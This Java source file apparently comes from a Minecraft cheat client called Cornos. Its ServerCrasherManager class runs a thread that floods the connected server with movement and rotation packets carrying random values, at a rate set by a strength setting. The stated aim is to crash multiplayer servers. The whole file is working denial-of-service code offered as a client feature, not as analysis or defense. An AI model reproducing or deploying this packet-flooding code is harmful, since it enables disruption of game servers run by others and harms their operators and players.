package me.constantindev.ccl.etc;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.reg.ModuleRegistry;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.BlockPos;

import java.util.Random;

@SuppressWarnings("BusyWait")
public class ServerCrasherManager {
    public static int strength = 100;
    public static String mode = "";
    public static Thread runner = new Thread(() -> {
        while (true) {
            try {
                if (!ModuleRegistry.getByName("servercrasher").isOn.isOn()) {
                    Thread.sleep(10);
                    continue;
                }
                if (Cornos.minecraft.getNetworkHandler() == null) {
                    ModuleRegistry.getByName("servercrasher").isOn.setState(false);
                    continue;
                }
                Random r = new Random();
                switch (mode) {
                    case "rotation":
                        int yaw = r.nextInt(65535);
                        int pitch = r.nextInt(65535);
                        Cornos.minecraft.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookOnly(yaw, pitch, true));
                        break;
                    case "location":
                        double x = r.nextDouble();
                        double z = r.nextDouble();
                        assert Cornos.minecraft.player != null;
                        BlockPos pp = Cornos.minecraft.player.getBlockPos();
                        Cornos.minecraft.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionOnly(pp.getX() + x, pp.getY(), pp.getZ() + z, true));
                        break;
                    case "biglocation":
                        double x1 = r.nextDouble() * 10;
                        double z1 = r.nextDouble() * 10;
                        assert Cornos.minecraft.player != null;
                        BlockPos pp1 = Cornos.minecraft.player.getBlockPos();
                        Cornos.minecraft.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionOnly(pp1.getX() + x1, pp1.getY(), pp1.getZ() + z1, true));
                        break;
                }
                Thread.sleep(100 / strength - 1);
            } catch (Exception ignored) {
                ModuleRegistry.getByName("servercrasher").isOn.setState(false);
            }
        }
    });
}
